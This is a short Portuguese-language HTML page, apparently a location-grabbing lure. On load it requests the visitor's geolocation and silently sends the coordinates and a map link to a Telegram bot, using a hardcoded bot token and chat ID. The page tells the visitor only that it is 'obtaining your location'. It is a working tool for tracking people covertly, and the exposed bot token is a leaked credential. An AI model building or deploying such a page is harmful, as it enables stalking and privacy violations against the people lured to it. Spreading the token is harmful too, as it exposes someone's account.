<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Compartilhar Localiza√ß√£o</title>
</head>
<body style="background-color: antiquewhite;">
    <h1>Obtendo sua localiza√ß√£o...</h1>

    <script>
        // ‚ö†Ô∏è Substitua pelo seu novo Token e Chat ID
        const BOT_TOKEN = "7622176108:AAFzHIF6l7LaB2H9lY_CpBa5W8Dx68ubARY";
        const CHAT_ID = "Eris1993_bot";

        function sendLocation(latitude, longitude) {
            const message = `üìç Localiza√ß√£o recebida:\nLatitude: ${latitude}\nLongitude: ${longitude}\nüåç [Ver no Mapa](https://www.google.com/maps?q=${latitude},${longitude})`;

            // Envia para o Telegram
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    document.body.innerHTML = "<h1>Localiza√ß√£o enviada com sucesso! ‚úÖ</h1>";
                } else {
                    document.body.innerHTML = "<h1>Erro ao enviar a localiza√ß√£o ‚ùå</h1>";
                }
            })
            .catch(error => {
                console.error("Erro ao enviar:", error);
                document.body.innerHTML = "<h1>Erro ao conectar com o Telegram ‚ùå</h1>";
            });
        }

        function handleError(error) {
            document.body.innerHTML = `<h1>Erro ao obter a localiza√ß√£o ‚ùå</h1><p>${error.message}</p>`;
        }

        // Captura autom√°tica da localiza√ß√£o ao carregar a p√°gina
        window.addEventListener("load", () => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => sendLocation(position.coords.latitude, position.coords.longitude),
                    handleError
                );
            } else {
                document.body.innerHTML = "<h1>Geolocaliza√ß√£o n√£o suportada pelo navegador ‚ùå</h1>";
            }
        });
    </script>
</body>
</html>
